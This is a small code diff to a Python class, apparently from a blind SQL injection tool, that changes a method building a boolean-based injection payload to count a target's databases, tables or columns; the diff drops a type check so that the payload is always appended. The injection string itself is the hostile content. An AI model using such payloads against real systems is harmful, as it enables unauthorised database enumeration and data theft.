@@ -95,8 +95,7 @@ class Blind():
     def count_params(self, operator, number, table):
         '得到所要查的东西有多少库、表、列'
         params = dict(self.params)
-        if injectiontype == 'Bool':
-            params[self.vulnerable_param] += '\' and {0} {1} (select count(*) from {2}) -- '.format(number,operator,table)
+        params[self.vulnerable_param] += '\' and {0} {1} (select count(*) from {2}) -- '.format(number,operator,table)
         return params
 
     def length_params(self, operator,number, field, table, offset):
